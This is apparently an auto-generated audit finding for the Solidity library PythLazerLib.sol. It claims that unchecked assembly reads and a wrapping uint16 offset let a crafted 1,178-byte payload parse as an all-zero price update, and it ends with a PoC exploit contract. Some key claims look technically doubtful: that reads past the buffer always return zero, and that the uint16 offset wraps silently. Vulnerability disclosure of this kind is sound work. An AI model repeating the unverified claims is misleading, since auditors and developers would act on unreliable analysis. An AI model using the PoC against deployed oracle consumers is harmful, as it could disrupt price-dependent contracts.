### Title
Missing Bounds Check in Assembly Byte-Reading Helpers Enables `uint16` Position Overflow and Silent Incorrect Parsing — (`File: lazer/contracts/evm/src/PythLazerLib.sol`)

---

### Summary

`PythLazerLib.sol` contains four private assembly helpers — `_readBytes1`, `_readBytes2`, `_readBytes4`, and `_readBytes8` — that read from a `bytes memory` buffer at a caller-supplied `uint16 pos` offset with no bounds validation. This is a direct structural analog to the `LibBytes.sol` vulnerability. Because `pos` is typed as `uint16`, a crafted payload can cause it to silently wrap around (overflow), bypassing the only post-parse integrity check (`require(pos == payload.length)`), and causing `parseUpdateFromPayload` to return a structurally valid but entirely zero-valued `Update` without reverting.

---

### Finding Description

All four read helpers follow the same pattern:

```solidity
function _readBytes8(bytes memory data, uint16 pos) private pure returns (uint64 value) {
    assembly {
        let word := mload(add(add(data, 0x20), pos))
        value := shr(192, word)
    }
}
``` [1](#0-0) 

No check of the form `require(pos + N <= data.length)` exists in any of the four helpers. In the EVM, `mload` beyond allocated memory silently returns zero — it does not revert.

These helpers are called throughout the entire parse chain:

- `parsePayloadHeader` calls `_readBytes4` and `_readBytes8` and `_readBytes1`
- `parseFeedHeader` calls `_readBytes4` and `_readBytes1`
- `parseFeedProperty` calls `_readBytes1`
- `parseFeedValueUint64/Int64/Uint16/Int16/Uint8` each call one helper [2](#0-1) 

The only guard against malformed input is the terminal check in `parseUpdateFromPayload`:

```solidity
require(pos == payload.length, "Payload has extra unknown bytes");
``` [3](#0-2) 

Because `pos` is `uint16`, it wraps modulo 65,536. An attacker can craft a payload whose total logical byte consumption is `payload.length + k × 65,536` for some integer `k`, making `pos` wrap back to exactly `payload.length` and satisfying the check.

**Concrete overflow arithmetic:**

| Field | Size |
|---|---|
| Header (magic + timestamp + channel + feedsLen=29) | 14 bytes |
| Per feed: feed_id + num_properties=255 | 5 bytes |
| Per property: property_id=0 (Price) + int64 value | 9 bytes |
| Per feed total | 5 + 255×9 = 2,300 bytes |
| Grand total | 14 + 29×2,300 = **66,714** |
| 66,714 mod 65,536 | **1,178** |

A payload of exactly **1,178 bytes** with `feedsLen=29` and `num_properties=255` per feed causes `pos` to wrap to `1178`, satisfying `pos == payload.length`. All reads beyond the actual payload boundary return zero from EVM zero-memory. [4](#0-3) 

Because `propertyId` reads as `0` (≤ 12, passes the `require`), every out-of-bounds property is parsed as `Price` with value `0`, which sets the tri-state to `ApplicableButMissing`. [5](#0-4) 

---

### Impact Explanation

`parseUpdateFromPayload` is declared `public pure` and is the intended integration point for all downstream Lazer consumer contracts. [6](#0-5) 

A downstream contract that calls `parseUpdateFromPayload` with an attacker-supplied (unverified) payload receives a structurally complete `Update` struct — correct feed count, correct property count — but with every price field zero and every property state set to `ApplicableButMissing`, with **no revert**. Any consumer that does not strictly gate on `hasPrice()` before acting on `getPrice()` will silently receive zero prices. Even consumers that do check `hasPrice()` will observe a valid-looking update with all prices missing, which can be used to stall or manipulate price-dependent logic (e.g., preventing liquidations, blocking oracle reads).

---

### Likelihood Explanation

`parseUpdateFromPayload` is `public pure` — it requires no fee, no signature, no privileged role. Any EOA or contract can call it with an arbitrary `bytes memory` argument. The overflow payload is deterministically constructible from the arithmetic above. The attacker does not need a trusted signer key; they bypass `verifyUpdate` entirely by calling the library function directly or by supplying the crafted bytes to any downstream contract that accepts user-provided payloads before verification. [7](#0-6) 

---

### Recommendation

Add explicit bounds checks inside each `_readBytes*` helper, mirroring the fix recommended for `LibBytes.sol`:

```solidity
function _readBytes8(bytes memory data, uint16 pos) private pure returns (uint64 value) {
    require(uint256(pos) + 8 <= data.length, "Out-of-bounds read");
    assembly {
        let word := mload(add(add(data, 0x20), pos))
        value := shr(192, word)
    }
}
```

Apply the same pattern to `_readBytes1` (`+1`), `_readBytes2` (`+2`), and `_readBytes4` (`+4`). Additionally, change `pos` from `uint16` to `uint256` throughout the parse chain to eliminate the overflow vector entirely.

import {PythLazerLib} from "lazer/contracts/evm/src/PythLazerLib.sol";
import {PythLazerStructs} from "lazer/contracts/evm/src/PythLazerStructs.sol";

contract PoC {
    function exploit() external pure returns (PythLazerStructs.Update memory update) {
        // Build a 1,178-byte payload:
        //   bytes [0..3]  : FORMAT_MAGIC = 0x93D4B875 (2479346549)
        //   bytes [4..11] : timestamp (any value, e.g. 0x0102030405060708)
        //   byte  [12]    : channel = 1 (RealTime)
        //   byte  [13]    : feedsLen = 29
        //   bytes [14..18]: feed_id[0] = 0x00000001, num_properties = 255
        //   byte  [19]    : property_id = 0 (Price)
        //   bytes [20..27]: price value = 0
        //   ... remaining 1150 bytes: arbitrary (will be read as zeros beyond boundary)
        //
        // Total logical bytes consumed by parser:
        //   14 + 29*(5 + 255*9) = 14 + 29*2300 = 66714
        //   66714 mod 65536 = 1178  ==  payload.length  => final require passes
        //
        // Result: update has 29 feeds, each with 255 Price properties,
        //         all ApplicableButMissing (price == 0). No revert.

        bytes memory payload = new bytes(1178);
        // Write magic
        payload[0] = 0x93; payload[1] = 0xD4; payload[2] = 0xB8; payload[3] = 0x75;
        // timestamp
        payload[4] = 0x01; payload[5] = 0x02; payload[6] = 0x03; payload[7] = 0x04;
        payload[8] = 0x05; payload[9] = 0x06; payload[10] = 0x07; payload[11] = 0x08;
        // channel = 1 (RealTime)
        payload[12] = 0x01;
        // feedsLen = 29
        payload[13] = 0x1D;
        // feed[0]: feed_id = 1
        payload[14] = 0x00; payload[15] = 0x00; payload[16] = 0x00; payload[17] = 0x01;
        // feed[0]: num_properties = 255
        payload[18] = 0xFF;
        // feed[0], property[0]: property_id = 0 (Price), value = 0 (8 bytes)
        payload[19] = 0x00;
        // bytes [20..27] = 0x00 (price = 0) — already zero from `new bytes`
        // All remaining bytes are 0x00 — out-of-bounds reads also return 0x00
        // Parser interprets every subsequent property as Price(0) => ApplicableButMissing

        update = PythLazerLib.parseUpdateFromPayload(payload);
        // Returns without revert; update.feeds[*]._price == 0 for all feeds
    }
}
